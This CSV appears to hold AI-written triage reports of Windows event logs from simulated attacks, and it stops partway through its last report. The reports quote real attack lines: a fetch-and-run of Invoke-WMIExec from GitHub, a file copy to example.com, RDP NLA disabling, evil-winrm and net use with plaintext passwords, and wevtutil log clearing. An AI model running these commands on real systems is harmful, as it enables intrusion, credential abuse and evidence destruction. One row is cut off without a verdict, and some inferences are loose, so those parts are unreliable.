Directory Name,AI Response
Enable Windows Remote Management,"Upon analyzing the Windows event logs provided, a few points of interest emerge that may indicate suspicious behavior:

1. **PowerShell Usage with Enable-PSRemoting**:
   - Logs (EventRecordID 1043-1051) show repeated instances of PowerShell being executed with the command `powershell.exe & {Enable-PSRemoting -Force}`. 
   - Enabling PSRemoting without proper oversight could allow remote users to execute scripts on the machine, possibly indicating an attempt to gain remote control or execute further commands.

2. **Event Log Clearing (System, Security, and PowerShell Logs)**:
   - There are multiple events (EventRecordID 3568, 3569, 30336) indicating the clearing of event logs using `wevtutil.exe`, a typical behavior of attackers trying to cover their tracks. 
   - The command `wevtutil.exe cl <LogName>` is often used to clear event logs, making it difficult to track further, reinforcing the suspicion of malicious intent.

3. **Use of Admin Privileges**:
   - The user `admin_test` shows multiple privilege elevations (EventID 4672). Such elevations include powerful rights such as SeDebugPrivilege and SeTakeOwnershipPrivilege, which could be leveraged for malicious activities.

4. **Network Logins**:
   - The logs indicate a remote login using NTLM from a workstation (`DESKTOP-3HL5B2P`) with IP addresses `fe80::e3b5:5371:12a8:9c77` and `192.168.0.102`. NTLM network logins should be monitored closely as they can be exploited or used illegitimately.

5. **Presence of MicrosoftAccount Login Attempts**:
   - There are several EventID 5379 logs indicating attempts to read Microsoft account credentials, which result in failure (ReturnCode 3221226021). Although the cause of these failures isn't inherently malicious, it could point to failed attempts to access user accounts.

6. **Unexpected Software Execution**:
   - Execution of various executables (e.g., `whoami.exe`, `hostname.exe`) is logged. While not indicative of malicious activity by themselves, combined with the other logs, this behavior adds to the profile of potentially recon or misconfigured automation scripts.

### Assessment:

Based on the above analysis, the activities recorded in the logs point toward suspicious actions, particularly around the clearing of logs, remote PowerShell usage, and privilege escalation events. While these activities do not definitively conclude a malicious attack, they strongly suggest potential compromise or preparation for malicious conduct.

### Conclusion:

**Resolution: SUSPICIOUS**

### Guidance on How to Proceed:

1. **Investigate the 'admin_test' Account**:
   - Verify if the activity under the `admin_test` account is legitimate and if such tasks have been authorized by a system administrator.

2. **Review Network Configurations**:
   - Check for any unauthorized remote access settings and ensure PowerShell remoting is appropriately configured and controlled.

3. **Examine Remote Logins**:
   - Confirm that logins from outside IPs or specific workstations are legitimate. If they are not recognized, initiate a security review of the source devices.

4. **Retrieve Additional Context**:
   - Gather more context on the use of `wevtutil` and any scripts or automation processes that may be employing it. Look for signs of ongoing tampering or unauthorized sessions.

5. **Enhanced Monitoring**:
   - Implement or strengthen monitoring on Windows event logs, especially regarding PowerShell usage and privileged account activities.

Taking these steps will help identify the root cause of the suspicious activities and prevent potential exploitation or further malicious behavior."
PowerShell Lateral Movement using MMC20,"### Detailed Analysis:

#### Suspicious or Anomalous Behavior:

1. **PowerShell Activity:**
   - The logs indicate the execution of PowerShell on `Server002` with the command line to execute the Windows Calculator (`calc.exe`):
     ```
     powershell.exe & {[activator]::CreateInstance([type]::GetTypeFromProgID(""MMC20.application"",""localhost"")).Document.ActiveView.ExecuteShellCommand(""c:\\windows\\system32\\calc.exe"", $null, $null, ""7"")}
     ```
     This execution is unusual and could indicate malicious activity, especially if the usage of `MMC20.application` and `ExecuteShellCommand` is abnormal in the environment. Such methods can be leveraged by attackers to bypass execution policies and conduct code execution.

2. **Event Log Clearing:**
   - The system and security event logs were cleared shortly after the anomalous PowerShell execution.
   - Event 104 from the system and Event 1102 from the security logs show `admin_test` clearing logs:
     - This is typically a sign of malicious activity where an attacker attempts to cover their tracks by deleting evidence from the logs.

3. **Sysmon Logs:**
   - Multiple instances of `wevtutil.exe` execution with the command line indicating clearing of event logs:
     ```
     C:\Windows\system32\wevtutil.exe cl Microsoft-Windows-Sysmon/Operational
     C:\Windows\system32\wevtutil.exe cl Application
     C:\Windows\system32\wevtutil.exe cl System
     C:\Windows\system32\wevtutil.exe cl ""Windows PowerShell""
     ```
   - This pattern further supports the hypothesis that an effort was made to clear logs after possible unauthorized activity.

4. **Privilege Escalation:**
   - Event ID 4672 indicating `admin_test` was granted high-privilege rights (`SeSecurityPrivilege, SeBackupPrivilege, SeRestorePrivilege, etc.`). This event on its own is not necessarily malicious, but combined with the other behaviors, it is concerning.

5. **Network Activity:**
   - There is no direct network activity captured in the logs, but the presence of IP address in the 4624 logon events (`fe80::e3b5:5371:12a8:9c77`) should be noted if that IP is not recognized in the organization.

#### Malicious Activity or Compromise Evidence:

Based on the provided logs, there is strong evidence pointing towards malicious activity:

- **Execution of Suspicious PowerShell Commands:** The execution of commands to run calculator through unconventional methods is a red flag.
  
- **Clearance of Security Logs:** The sequence of clearing various logs immediately after suspicious command execution strongly implies attempts to remove traces of this activity.

- **Usage of Privileged Account:** The anomalies involve a privileged administrative account (`admin_test`), indicating this account may have been compromised or misused.

### Assessment:

The evidence in the logs suggests that the activities observed are coordinated attempts at executing potentially harmful commands followed by log clearance to obfuscate activities. This chain of events strongly suggests unauthorized actions were taken on the system.

### Resolution:

**Resolution: MALICIOUS**

This set of logs should be regarded as evidence of a compromise. Immediate steps include:

1. **Quarantine and Investigate:** Isolate `Server002` to prevent further access or damage.
2. **Credentials & Access Review:** Review and reset credentials for `admin_test` and any other accounts showing anomalous activity.
3. **Forensic Analysis:** Deep dive into forensic analysis to uncover any additional malware or evidence of compromise.
4. **System Restore or Rebuild:** Consider restoring or rebuilding the compromised system to ensure complete eradication of malicious artifacts.
5. **Post-Incident Corrections:** Implement stronger logging, monitoring, and incident response enhancements to avoid future occurrences.

**Note:** Further investigation involving broader context and additional systems is recommended to assess if this behavior is part of a larger attack campaign."
Exfiltration Over SMB over QUIC (NET USE),"Upon examining the provided event logs, several activities stand out that could indicate possible malicious actions, particularly around the use of the `wevtutil` command, clearing of event logs, and the execution of potentially suspect PowerShell commands. Here's a breakdown of the suspicious behavior observed:

1. **Event Log Clearing:**
   - Multiple event logs were cleared, as seen in System Event ID 104 and Security Event ID 1102 entries.
   - Specific logs cleared include the System, Windows PowerShell, and Security logs by the user ""admin_test"". Log clearing can be a tactic to cover tracks after unauthorized activity.

2. **Command-line Activity:**
   - The use of `wevtutil.exe`, a command-line utility for managing event logs, is noted in Sysmon logs. Entries for `wevtutil.exe` show it was used with the ""cl"" (clear) command to clear the logs.
   - This action alone is suspicious, particularly since it coincides with the log clearing events.

3. **PowerShell Command Execution:**
   - A potentially malicious PowerShell command was executed: `powershell.exe & {NET USE * '\\\\example.com\\sales' /TRANSPORT:QUIC /SKIPCERTCHECK, copy 'C:\\path\\to\\file.txt' '*:\\'}`.
   - The use of `NET USE` alongside PowerShell for network drive mapping and file copying, especially with `/SKIPCERTCHECK`, indicates attempts to establish connections and transfer files possibly without legitimate certificates.
   - This behavior suggests potential unauthorized data access or exfiltration.

4. **Execution from Unusual Directories:**
   - PowerShell and other processes run from temporary directories can be an indicator of non-standard operations, often associated with intermediate stages of complex attacks.

5. **Process Relationships and User Context:**
   - The processes, including `wevtutil.exe` and PowerShell, were executed by ""SERVER002\\admin_test"" with high integrity level, indicating high privileges.
   - The process lineage doesn't show expected parent processes for legitimate operations, raising further suspicion of misuse.

Assessing the entirety of the logs, these activities together suggest attempts to conceal actions, extract or manipulate data, and execute potentially harmful operations without regular detection, implying a clear sign of malicious activity. Consequently, the resolution for this analysis is:

**Resolution: MALICIOUS**

### Recommended Actions:
- **Immediate containment**: Isolate the affected system (Server002) from the network to prevent further potential unauthorized actions.
- **Complete a full forensic investigation**: Disk and memory forensics should be conducted to understand the extent of the compromise.
- **Review user accounts and privileges**: Audit the actions of ""admin_test"" and ensure access privileges are appropriate and not excessive.
- **Revocation of credentials**: Reset credentials for affected and potentially compromised accounts.
- **Log review and monitoring enhancement**: Ensure logging and alerting mechanisms are comprehensive and actively monitored for unauthorized log clearance or use of command-line tools."
Execute command writing output to local Admin Share,"Upon analyzing the provided Windows event logs from the System, Security, Sysmon, Application, and Windows PowerShell channels, several events stand out as suspicious and potentially indicative of malicious activity. Below is a detailed analysis of the suspicious activities observed:

1. **Log File Clearing**:
   - System events 104 log entries show that the event logs for the System, Windows PowerShell, and Security channels have been cleared by the user `admin_test`. The command `wevtutil.exe` is used for this action, which is captured in Sysmon events. This behavior is often associated with malicious activity as it could indicate an attempt to cover tracks.

2. **Time Manipulation**:
   - Security logs show events 4616, indicating that the system time was changed. Unauthorized time changes can be used to manipulate log timestamps, making detection of activities more complex.

3. **Suspicious Process Executions**:
   - Sysmon logs show multiple invocations of the `wevtutil.exe` with the `cl` (clear log) command targeting different log channels (Application, Security, System, and Windows PowerShell). This is a highly suspicious activity as it complements the entries regarding cleared event logs.
   - The execution of `cmd.exe` for operations such as writing output to `\\127.0.0.1\ADMIN$\output.txt` shows attempts to execute commands and redirect outputs, possibly indicating command and control activity or data exfiltration attempt.

4. **Failed Access**:
   - Security log entries for event ID 5379 indicate several failed attempts to access credentials for a `MicrosoftAccount`, which indicates there might have been an attempt to compromise user accounts or gather user info.

5. **Execution of Windows Built-in Utilities**:
   - Utilities like `hostname.exe`, `whoami.exe`, and various `cmd.exe` processes were executed under a high integrity level by the user `admin_test`. While these by themselves can be legitimate, the context of combined suspicious activities suggests a deeper investigation is warranted.

6. **Unusual Parent Processes**:
   - Several processes have `wsmprovhost.exe` as their parent, which can be suspicious especially in the context of remote management or unauthorized access if not paired with legitimate administrative tasks known to leverage Windows Remote Management (WinRM).

### Assessment and Recommended Action:

**Resolution: SUSPICIOUS**

The activities in the logs contain multiple indicators typical of malicious behavior, such as:
- Clearing of event logs.
- Manipulation of system time.
- Executing processes like `wevtutil.exe` to clear logs or execute utilities (`cmd.exe`, `hostname.exe`, `whoami.exe`) in potentially malicious ways.
- Unauthorized attempts to access credentials.

These activities are highly suggestive of a host compromise or attempted compromise, possibly aiming to conceal malicious actions and gather sensitive information. The immediate steps should include:

1. **Isolate the System**: Disconnect the affected machine from the network to prevent further potential data loss or compromise.

2. **Full Forensic Analysis**: Conduct a thorough investigation, collecting disk and memory images for comprehensive analysis.

3. **Review Network Traffic**: Analyze network logs for signs of data exfiltration or command and control activity.

4. **Change Credentials**: Reset passwords for the `admin_test` account and any other accounts that may have been compromised.

5. **Implement Enhanced Monitoring**: Increase the level of logging and monitoring around critical assets, and implement alerts for anomalies such as log clearing or privilege escalation.

6. **Plan Remediation**: Prepare a system recovery plan to address potential residue from the activity noted and fortify against similar future incidents. Consider conducting a penetration test to identify and remediate vulnerabilities."
Rubeus Kerberos Pass The Ticket,"Upon analyzing the provided Windows event logs, the following observations and assessments were made:

### Suspicious or Anomalous Behavior:

1. **Clearing of Event Logs:**
   - The `Security` log was cleared, evidenced by event ID `1102` in the Security log. This activity was executed under the username `admin_test`. Clearing of logs is a common tactic to cover tracks after performing potentially malicious activity.
   - The `System` log (event ID `104`) and `Windows PowerShell` log (event ID `104`) were also cleared by the same user. This further indicates an attempt to obscure evidence.

2. **Execution of Potentially Malicious Tools:**
   - A PowerShell script executed `PsExec.exe`, which is a Sysinternals tool often abused by attackers for executing processes remotely. Its usage here involves executing another tool, `rubeus.exe`.
   - The use of `rubeus.exe` suggests an attempt to perform Kerberos ticket requests and manipulation (asktgt and asktgs command lines seen in the logs). This is indicative of credential dumping or Kerberos ticket tampering, often used in lateral movement and privilege escalation during attacks.

3. **Use of High Privilege Commands:**
   - Execution of `wevtutil.exe` command multiple times to clear event logs (using the `cl` command) confirms an attempt to hide these actions from standard Windows event logging.
   - Commands such as `whoami` and `hostname.exe` were executed, possibly to gather environment and user privilege information.

### Indicators of Compromise:

- The consistent clearing of event logs by `admin_test` is a major red flag, pointing towards possible malicious activity.
- The combination of using PsExec and Rubeus suggests attempts to gain higher privileges and maintain persistence through credential abuse.
- The execution of high-level administrative commands indicates that the involved user account had significant privileges, potentially allowing serious impact if those credentials were compromised or abused.

### Assessment:

Based on the analysis of the provided event logs, the activities performed on this Windows host are consistent with techniques used in targeted attacks involving credential theft and unauthorized lateral movement. The sequential activities, from clearing logs to executing Rubeus, strongly suggest an attempt to evade detection and escalate privileges.

### Resolution:

**MALICIOUS**: The logs contain clear indicators of malicious activity and should be treated as a high-priority security incident.

### Recommended Actions:

1. **Immediate Incident Response:**
   - Isolate the affected machine from the network to prevent further unauthorized access.
   - Conduct a thorough forensic analysis to identify any further compromises.
   - Reset passwords for all potentially affected accounts, particularly those with administrative privileges.

2. **Audit and Monitoring:**
   - Review and enhance monitoring on critical systems, focusing on PowerShell and PsExec usage.
   - Implement and audit least privilege access to minimize impact of future potential incidents.

3. **Security Hardening:**
   - Disable or restrict the use of tools like PsExec and ensure PowerShell script logging is enabled and monitored.
   - Increase the frequency of security awareness training to help users recognize and report suspicious activities.

Taking these steps will help ensure any malicious activities are identified and mitigated quickly, reducing the risk of a successful compromise of other systems or sensitive information."
Remote Code Execution with PS Credentials Using Invoke-Command,"The log entries provided contain several indicators of potentially suspicious activity that warrant a closer look:

### Analysis:

1. **Event Log Clearing:**
   - Multiple event log clearing entries (Event ID 104) indicate that logs in Security, System, and Windows PowerShell channels were cleared by the user `admin_test` on `Server002`. This is often used maliciously to cover tracks.
   - Specifically, we see the use of `wevtutil.exe` with command-line arguments like `cl` that clear logs. This can be suspicious if done without administrative oversight.

2. **Privilege Escalation:**
   - Event ID 4672 recorded special privilege assignment to `admin_test`, including `SeDebugPrivilege`, `SeTakeOwnershipPrivilege`, and others known to be used for administrative actions, which could be used for privilege escalation or malicious activities.

3. **Anonymous Logins:**
   - The presence of `ANONYMOUS LOGON` entries (Event IDs 4624 and 4634) on Logon Type 3 (network) is suspicious, especially when not expected, as it may indicate unauthorized attempts to access resources.

4. **PowerShell Commands:**
   - The use of `Enable-PSRemoting -Force` along with `Invoke-Command` suggests remote PowerShell execution, which is a potential method for executing commands over the network if not appropriately monitored or secured.
   - Diagnostic tools like `whoami` were executed, possibly to identify currently logged-on users or verify access levels.

5. **Suspicious Processes:**
   - Sysmon logs indicate usage of `wevtutil.exe` for clearing logs, which is suspicious.
   - The `whoami.exe` command executed via PowerShell, again, potentially indicates credential or user enumeration.

6. **Network Credential Operations:**
   - Event ID 5379 (Failure of reading credentials with return code indicating access-denied) suggests potential attempts to use credentials potentially tied to network accounts (`MicrosoftAccount` and `WindowsLive`).

### Assessment:

The combined presence of these actions strongly suggests an attempt to cover tracks and operate stealthily, possibly after a compromise. The clearing of logs, the remote PowerShell executions, and session manipulations all reflect behaviors typically seen in post-exploitation phases of a cyber-attack.

### Conclusion:

Based on the detailed analysis, the activity observed in the logs can be summarized as **MALICIOUS**. The behaviors are consistent with an intruder attempting to conduct administrative operations while minimizing forensic evidence, indicating a potential security breach.

### Recommendations:

1. **Immediate Containment:**
   - Isolate the affected machine (`Server002`) from the network to prevent further spread or exfiltration.

2. **Forensic Investigation:**
   - Conduct a full forensic investigation focusing on unauthorized access and potential data extraction or modification.
   - Review other systems for similar indicators of compromise.

3. **Reinforce Security Measures:**
   - Implement monitoring for administrative actions (log clearing, privilege usage) more robustly.
   - Review and restrict user roles and permissions, especially concerning privileged accounts like `admin_test`.

4. **Patch Management and Security Updates:**
   - Ensure all systems are up to date with the latest security patches, with specific focus on remote management tools like PowerShell.

5. **Awareness and Training:**
   - Provide training on recognizing indicators of compromise and the importance of security measures to prevent similar incidents in the future.

This assessment concludes that the observed activities warrant immediate response and further detailed investigation."
Disable NLA for RDP via Command Prompt,"**Analysis of Logs**

Upon reviewing the provided logs, several points of interest suggest potential malicious activities:

1. **Log Clearing Activity:** The Sysmon and Windows event logs show multiple instances of `wevtutil.exe` being used to clear logs (`""CommandLine"":""\""C:\\Windows\\system32\\wevtutil.exe\"" cl [LogType]""`). The logs were cleared for multiple channels including System, Security, and PowerShell shortly after some system log entries were generated. This is a common tactic used by attackers to cover their tracks by attempting to remove traces of their activity from the event logs.

2. **Privilege Escalation and Odd Command Execution:**
   - The `admin_test` user was granted multiple high privileges during the session (`SeDebugPrivilege`, etc.). This event is valid for privileged operations but is suspicious in context with the other activities and potential log clearance.
   - The execution of `cmd.exe` with a command to alter registry settings related to Terminal Server (`\""cmd.exe\"" /c reg add \""HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp\"" /v UserAuthentication /d 0 /t REG_DWORD /f`) indicates a potential configuration change designed to weaken RDP security, possibly opening a backdoor for future RDP sessions.

3. **Suspicious User Activity:**
   - The account `admin_test` appears to be used for activities that involve clearing logs and running system-executing commands from directories such as `C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\`, which is atypical for standard administration tasks.

4. **Time Manipulation:**
   - The logs indicate that the system time was altered. Events show changes from a future time back to an earlier valid one, which is unusual and could be used to confuse logging timestamps, again as part of obfuscation.

5. **Logon Events:**
   - Multiple Logon events using NTLM authentication from a different workstation (DESKTOP-3HL5B2P), while not necessarily suspicious on their own, in context could indicate unauthorized access.

**Assessment:**

Based on the above findings of log clearing activity, privilege escalation, suspicious registry modification, and system time manipulation, the events appear to be indicative of unauthorized access and potential malicious activity. The legitimacy of certain executable runs and log clearances combined with altered logs require further investigation to ensure there's no undetected persistence or compromise.

**Resolution: MALICIOUS**

**Guidance on How to Proceed:**

1. **Immediate Response:**
   - Isolate the system to prevent further unauthorized access or lateral movement.
   - Conduct a forensic analysis of the involved system for artifacts not visible in logs.
   - Reset potentially compromised credentials and review Access Control.
  
2. **Containment and Investigation:**
   - Review and monitor other systems for similar activities.
   - Check for anomalies in firewall logs and network traffic indicative of data exfiltration or further attacks.

3. **Recovery and Hardening:**
   - Apply necessary patches and updates if some remediation steps open security avenues.
   - Educate relevant staff on recognizing such attacks and improving security practices.

4. **Report and Documentation:**
   - Document the incident comprehensively and report to relevant stakeholders and/or law enforcement authorities.
   - Consider enhancing logging and monitoring capabilities to prevent and detect future incidents on time."
crackmapexec Pass the Hash,"To analyze the provided event logs, let’s focus on identifying suspicious or anomalous behavior that could indicate malicious activity:

1. **Clear Log Events:**
   - Multiple instances of logs being cleared (event ID 1102 in Security, event ID 104 in System for various channels) by a test administrative account (`admin_test`). Clearing logs can be a sign of covering tracks after malicious activity.

2. **Time Anomalies:**
   - Manipulation of system time is observed (event ID 4616 in Security, and Kernel-General events). Changing system time is often associated with attempts to disrupt log creation or alter time-stamp traces of malicious activities.

3. **Wevtutil Process Execution:**
   - Execution of `wevtutil.exe` to clear logs (`cl`) is notably suspicious, especially when combined with other log-clearing events. This tool is a legitimate Windows utility for managing event logs but is commonly used in attack scenarios to delete logs.

4. **Process Execution:**
   - PowerShell activity, unknown processes executed by `admin_test`, and a specifically crafted `cmd.exe` execution using `CrackMapExec`, along with an altered NTLM hash (`cc36cf7a8514893efccd3324464tkg1a`). These can be indicative of an attempt to pivot or propagate further exploitation, potentially using credential dumping or lateral movement.

5. **Privilege Escalation:**
   - The `4672` event indicates an account (`admin_test`) was assigned special privileges, including `SeDebugPrivilege`, which can be used to bypass certain security restrictions or access sensitive resources.

6. **Unexpected Services:**
   - Frequent updation and operation of Microsoft Edge Update services might suggest legitimate software behavior, although they occupy a significant portion of logs.

**Assessment and Recommendations:**

The combination of log-clearing events, suspicious process executions, potential use of `CrackMapExec`, and manipulation of system time are clear indicators of malicious activity. This activity appears targeted at maintaining persistence, exploration, and potential data exfiltration.

**Proceeding with Resolution: MALICIOUS**

### Recommendations:
- **Incident Response Team Activation:** Immediately involve the incident response team to perform a thorough forensic analysis, focusing on data integrity and establishing a timeline of potential breaches.
- **Account Review:** Investigate the user account `admin_test` for potential compromise or misuse of administrative privileges.
- **System Audit:** Conduct a comprehensive audit of all admin-level users, recent changes, and abnormal activities across the network.
- **Log Management:** Implement centralized logging with immutable storage to ensure logs cannot be cleared or modified without detection.
- **Monitor Communications:** Check for unauthorized network communications or unusual data access patterns, especially concerning sensitive or critical infrastructure parts.
- **Examine for Threat Actors:** Regular checks for indicators of compromise (IOCs) related to advanced persistent threats (APTs) or other known malware signatures.
- **Educate and Train:** Continuous security education and awareness for all employees, emphasizing the detection and reporting of suspicious activities and phishing attempts.

These measures will help mitigate the impact and prevent potential future incidents."
WinRM Access with Evil-WinRM,"**Analysis of the Logs:**

1. **Event Log Clearing Activity:**
   - The logs show multiple instances of log clearing using `wevtutil.exe` for various channels (Security, System, and Windows PowerShell).
   - This behavior is often considered suspicious as malicious actors may clear logs to cover their tracks.

2. **Unusual PowerShell Activity:**
   - PowerShell was executed with a command-line argument involving `evil-winrm`. This tool is known to be used for unauthorized remote administration.
   - The command `powershell.exe & {evil-winrm -i Target -u Domain\Administrator -p P@ssw0rd1}` was executed. This shows an attempt to use Evil-WinRM for accessing the target system with the specified credentials.

3. **Logon Events with Elevated Privileges:**
   - There are multiple `4624` logon events with elevated rights, followed by `4672` indicating special privileges were assigned. This might point towards privilege escalation.

4. **Recurrent Credential Access Events:**
   - A sequence of `5379` events shows repeated attempts to access credentials through Microsoft's Live service with a consistent return code of `3221226021`, indicating an access attempt failure. 
   - While the failures are logged, repeated access attempts are suspicious.

5. **Processes Launched with High Integrity Level (Admin Rights):**
   - Use of `wevtutil.exe` to clear logs, and `powershell.exe` with admin (`High`) integrity levels is noted, reinforcing the risk factor.

**Assessment of the Situation and Threats/Risks Identified:**

- The combination of PowerShell activity with `evil-winrm`, repeated log clearing actions, attempts to access credentials, and elevated logon events presents indicators of a potentially compromised system.
- Unauthorized remote control attempts, especially using common post-exploitation tools, are strong signs of malicious activity.
- The actions taken, such as clearing logs, indicate an intention to conceal tracks, suggesting that the adversary is aware of detection risks.

Invoke-WMIExec Pass the Hash,"### Analysis of Windows Event Logs

Upon a detailed review of the provided Windows event logs, there are multiple indications of suspicious activities occurring on the host machine (Server002). The notable observations include:

1. **Clearing of Event Logs**:
   - **Security and System Event Logs Cleared**: Multiple instances show logs being cleared. This is generally considered suspicious as it can be an indicator that an attacker is trying to cover their tracks. For instance:
     - `EventRecordID 30350`: The Security log was cleared by the user `admin_test`.
     - `EventRecordID 3567 and 3568`: The System and Windows PowerShell logs were cleared by the user `admin_test`.

2. **Use of PowerShell for Potentially Malicious Activity**:
   - **Unusual PowerShell Activity**: There is a PowerShell command execution involving downloading and executing a script from an external source:
     - `CommandLine`: `""powershell.exe"" & {[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12, IEX (IWR 'https://raw.githubusercontent.com/Kevin-Robertson/Invoke-TheHash/.../Invoke-WMIExec.ps1' -UseBasicParsing);Invoke-WMIExec ...}`
     - This particular script has a reputation for usage in lateral movement or remote command execution, which could be potentially malicious.

3. **Execution of Administrative Commands**:
   - **Execution of `wevtutil.exe`**: The utility `wevtutil.exe` was used several times to clear logs, which is unusual in a standard user operation:
     - This utility is typically employed to manage and query event logs programmatically, and its use coincides with the cleared log events.
   
4. **Time Manipulation**:
   - **Time Changed on System**: Events indicating the system's time being modified were recorded:
     - This can be a technique to further obscure malicious activity timestamps within logs and is another indicator of suspicious behavior.

### Assessment

Based on the above observations, there are strong indications of malicious activity within the logs. The clearing of multiple types of event logs, the suspicious PowerShell activity involving external script fetching and execution, and the manipulation of system time suggest that an unauthorized user attempted to conduct malicious actions and cover their tracks.

### Resolution: MALICIOUS

Given the collected evidence and indicators of potentially compromised actions, the conclusion is that the activity observed in these logs is **malicious**. This warrants immediate response actions to secure the environment.

### Recommended Actions:

1. **Immediate Incident Response**:

   - Conduct a full forensic analysis of the machine to understand the extent of the compromise.
   
2. **Credential Audit and Security Hardening**:
   - Reset passwords for affected accounts, especially `admin_test`, and ensure privileged account usage is audited.
   - Review permissions and access controls to ensure least privilege principles are effectively implemented.
   
3. **Log Analysis and Monitoring**:
   - Enhance monitoring on event logs and configure alerts for suspicious activities such as log clearing, PowerShell script executions from external sources, and attempts to modify system time.
   
4. **Patch and Vulnerability Management**:
   - Ensure all systems, including Server002, are up to date with the latest patches and security updates to mitigate the exploitation of any known vulnerabilities.

5. **User Awareness Training**:
   - Provide training on recognizing and reporting suspicious activities, especially for users with elevated privileges or high-value targets within the organization.

These actions aim to contain ongoing threats, identify the scope of the compromise, and prevent future incidents."
Map admin share,"Upon reviewing the provided logs, the following analysis and assessment have been made:

### Suspicious and Anomalous Behaviors:
1. **Event Log Clearance:**
   - Multiple event log entries indicate that the event logs have been cleared by a user ""admin_test"":
     - System Log: Cleared by ""admin_test"" using `wevtutil.exe`.
     - Security Log: Cleared by ""admin_test"" with EventID 1102.
     - Windows PowerShell: Cleared by ""admin_test"".
   - Event log clearance is a significant indicator of potential compromise as attackers often clear logs to hide their activities.

2. **Process Creation with `wevtutil.exe`:**
   - Multiple entries in the Sysmon log show the use of `wevtutil.exe` to clear logs, which corroborates with the system log clearance.
   - There is a frequent pattern of using system utilities (`wevtutil.exe`, `conhost.exe`) which can be expected as part of legitimate administrative duties, but the linkage to cleared logs signals potential misuse.

3. **Use of `net.exe` for Network Activities:**
   - A `cmd.exe` command executed a network command (`net use`) to access another domain:
     - Command: `cmd.exe /c ""net use \\Target\C$ P@ssw0rd1 /u:DOMAIN\Administrator""`
   - This can indicate lateral movement or unauthorized access, particularly concerning the use of explicit credentials in scripts.

### Potential Malicious Indicators:
- **Privilege Escalation:**  
  The user account ""admin_test"" has executed commands with elevated privileges, as indicated by EventID 4672 with privileges like `SeDebugPrivilege`.
  
- **Suspicious Logon Sessions:**  
  The logon session for ""admin_test"" indicates a logon type 3 (network logon), which could be normal, but should be correlated with any abnormal access times or failed attempts for additional clarity.

- **Attempt to Access `MicrosoftAccount`:**  
  There are multiple authentication attempts for what seems to be a Microsoft Account. Return codes (3221226021) indicate failures, aligning with EventID 5379. It’s crucial to verify if these attempts are usual for the system or correlate with the time of suspicious activities.

### Assessment:
- **Threats and Risks:**
  - **Data Exfiltration Risk:** Given the potential for unauthorized access indicated by attempted connections and log clearance, there's a risk sensitive data could be compromised.
  - **Compromise of User Credentials:** Usage of known credentials (and possible exposure of plaintext passwords in scripts) elevates the risk of broader network compromise.
  
### Conclusion:
Based on the analysis of multiple indicators including event log clearance, network commands with sensitive credentials, and elevated privilege usage, the logs contain clear signs of potential malicious activity.

### Guidance on How to Proceed:
1. **Immediate Isolation:** Consider isolating the affected machine (Server002) to prevent further movement within the network.
2. **Credentials Audit:** Force a password reset for ""admin_test"" and any potentially exposed accounts, and audit for any unauthorized access post-detachment.
3. **Comprehensive Review:** Conduct a full forensic investigation, including deeper analysis into any other possible compromised hosts.
4. **Security Hardening:** Implement more robust monitoring for administrative commands execution and ensure logs are being sent to a centralized and indelible logging server.
5. **Incident Response Activation:** Engage the incident response team to update policies and mitigate any further risk exposure.

**Resolution: MALICIOUS**"
Radmin Viewer Utility,"### Detailed Analysis of Logs

**1. Indicators of Potential Malicious Activity:**

**Sysmon Log Indicators:**

- **Log Clearing Commands**: Multiple instances of `wevtutil.exe` have been invoked with ""cl"" (clear) command on different logs such as `Microsoft-Windows-Sysmon/Operational`, `Application`, `System`, and `Security`. This is often associated with an attempt to cover tracks after malicious activities have been executed. These commands were executed under the user `SERVER002\\admin_test`, which further raises suspicion because it correlates with administrative actions intended to clear event logs. These activities appear under high integrity levels, indicating that they were executed with elevated privileges.
  
- **Frequent Use of `conhost.exe`**: Associated with the clearing of logs, `conhost.exe` processes appear to be spawned, typically used by command-line interfaces. While not inherently suspicious on their own, their usage context in this scenario, with time stamps closely aligning with log clearing commands, suggests they may be linked to nefarious command execution or scripting.

**System and Security Log Indicators:**

- **Event Log Clearance**: The system and security logs contain entries with EventID 104 and 1102, indicating that logs have been cleared for the system and security channels, a strong indication of potential malicious behavior to hide evidence of compromise. The user `admin_test` executed these actions.
  
**Application Log Indicators:**

- **Edge Update Events**: Although Edge Update is a legitimate Microsoft operation, the rapid sequence of these updates combined with the aforementioned suspicious activities could suggest misuse as a decoy or cover operation. The presence of the edge updater events heavily throughout the logs warrants further investigation, especially if they coincide with unauthorized access patterns.

**2. Assessment of the Situation:**

The actions taken by the user `admin_test`, specifically the multiple executions of `wevtutil.exe` to clear various logs, are strongly indicative of someone attempting to erase traces of their actions on the system. Appendix power command executions with elevated privileges also highlight potential misuse of administrative capabilities to perform these actions without generating alerts or logs that could be monitored for security purposes.

### Conclusion:

- **Resolution**: **MALICIOUS**

The combination of log-clearing activities across critical system and security logs, paired with usage of system utilities under high integrity levels via an administrative account (`admin_test`), strongly suggests a deliberate attempt to obfuscate unauthorized or malicious actions. The rapid execution of commands and clearing of logs to cover tracks are typical markers of malicious behavior, indicating a potential security breach or policy violation.

**Guidance on How to Proceed:**

1. **Immediate Containment**: Isolate the affected machine (`Server002`) to prevent further suspicious activity or lateral movement within the network. Disable the account `admin_test` pending further investigation.

2. **Forensic Data Collection**: Preserve the state of the system for detailed forensic investigation. Create a full disk image and memory dump of `Server002`.

3. **Log Analysis & Monitoring**: Review and correlate logs from other hosts to identify any lateral movement or propagation attempts. Engage in more sophisticated SIEM (Security Information and Event Management) queries to trace back the origin of these actions.

4. **Review & Threat Hunt**: Conduct a thorough review of privileged account activities and implement stricter controls (such as multi-factor authentication and enhanced logging).

5. **Patch & Update**: Ensure that all systems are up to date on patches to minimize exploit vectors via third-party applications, like browsers or browser updates, that may have been exploited as part of this attack vector.

6. **Communicate & Sanitize**: Communicate this incident within the relevant teams, and ensure any compromised credentials are reset following best security practices."
Map Admin Share PowerShell,"Based on the provided log entries, here is the analysis and assessment for potential malicious activity:

### Analysis

1. **Log Clearing Events**:
   - Multiple events in the System, Security, and PowerShell logs were cleared by the user `admin_test`. This action is observed in the following events:
     - **System log**: Event ID 104 indicates the clearing of the ""System"" and ""Windows PowerShell"" logs.
     - **Security log**: Event ID 1102 indicates the clearing of the Security log.
   - Log clearing can be indicative of an attempt to cover tracks, which is a common tactic used by malicious actors post-compromise.

2. **PowerShell Activities**:
